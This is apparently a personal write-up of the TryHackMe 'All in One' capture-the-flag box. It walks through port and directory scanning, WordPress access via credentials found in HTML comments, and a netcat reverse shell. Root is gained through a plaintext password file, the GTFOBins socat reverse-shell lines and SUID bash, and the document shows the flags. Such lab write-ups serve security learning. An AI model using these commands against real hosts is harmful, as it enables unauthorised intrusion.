# Box Name

## ALL_in_one

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# Rustscan
```bash
rustscan -r 1-65535 -a 10.10.32.81 --ulimit 5000  -- -sCV -oN nmap/allinone
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.32.81:21
Open 10.10.32.81:22
Open 10.10.32.81:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.199
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLcG2O5LS7paG07xeOB/4E66h0/DIMR/keWMhbTxlA2cfzaDhYknqxCDdYBc9V3+K7iwduXT9jTFTX0C3NIKsVVYcsLxz6eFX3kUyZjnzxxaURPekEQ0BejITQuJRUz9hghT8IjAnQSTPeA+qBIB7AB+bCD39dgyta5laQcrlo0vebY70Y7FMODJlx4YGgnLce6j+PQjE8dz4oiDmrmBd/BBa9FxLj1bGobjB4CX323sEaXLj9XWkSKbc/49zGX7rhLWcUcy23gHwEHVfPdjkCGPr6oiYj5u6OamBuV/A6hFamq27+hQNh8GgiXSgdgGn/8IZFHZQrnh14WmO8xXW5
|   256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOG6ExdDNH+xAyzd4w1G4E9sCfiiooQhmebQX6nIcH/
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

# Ferox
```bash
ferox -u http://10.10.32.81/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403  -x php,txt -t 100 -o logs/allinone

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.32.81/
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/allinone
 💲  Extensions            │ [php, txt]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200       63l       24w      197c http://10.10.32.81/hackathons
301        9 L      28 W     314c http://10.10.32.81/wordpress
```

# FTP  
-  nothing in ftp

# Web page 
### /hackathons
```html
<html>
<body>

<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>

<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
</body>
</html>
```

 ### CyberChef
 ![[Pasted image 20230201181734.png]]

### /wordpress
![[Pasted image 20230201182208.png]]

![[Pasted image 20230201182629.png]]
---
## Initial Foothold
---
# Wordpress
- ### Logged into word press as the elyana user
- ![[Pasted image 20230201182830.png]![[Pasted image 20230201182853.png]
![[Pasted image 20230201182945.png]]

## Wordpress 404 page exploit
```bash
 nc -lnvp 123a
listening on [any] 123 ...
^C
                                                                                                                                                                                
┌──(kn1ght㉿Kali)-[~/THM/allinone]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.0.199] from (UNKNOWN) [10.10.32.81] 59026
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:47:11 up  1:41,  0 users,  load average: 0.00, 0.01, 0.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can\'t access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                                                                                                
┌──(kn1ght㉿Kali)-[~/THM/allinone]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1234

bash-4.4$ export TERM=xterm
bash-4.4$ stty rows 60 cols 235
bash-4.4$    
```

---
## Privilege Escalation
----
```bash
bash-4.4$ find / -user elyana 2>/dev/null 
/home/elyana
/home/elyana/.local
/home/elyana/.local/share
/home/elyana/.cache
/home/elyana/user.txt
/home/elyana/.gnupg
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
bash-4.4$
```

```bash
bash-4.4$ ls -la /etc/mysql/conf.d/private.txt
-rwxrwxrwx 1 elyana elyana 34 Oct  5  2020 /etc/mysql/conf.d/private.txt
bash-4.4$ 
bash-4.4$ cat /etc/mysql/conf.d/private.txt
user: elyana
password: 'E@syR18ght'
bash-4.4$ 
bash-4.4$ id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
bash-4.4$ sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
bash-4.4$ 

```

# [[gtfobins]]
```bash
Run socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker machine to receive the shell.
Run socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane on the victims machine
```

![[Pasted image 20230201193315.png]]
### search for files with suid bit set
```bash
bash-4.4$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/ping
/bin/fusermount
/bin/su
'/bin/bash'
'/bin/chmod'
/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/lxc
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
'/usr/bin/socat'
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd

```

```bash
bash-4.4$ bash -p
bash-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.4# cat /root/root.txt
VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
bash-4.4# cat /root/root.txt | base64 -d
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
bash-4.4# cat /home/elyana/user.txt  
VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
bash-4.4# cat /home/elyana/user.txt|base64 -d \n
base64: n: No such file or directory
bash-4.4# cat /home/elyana/user.txt|base64 -d   
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
bash-4.4# 
```






---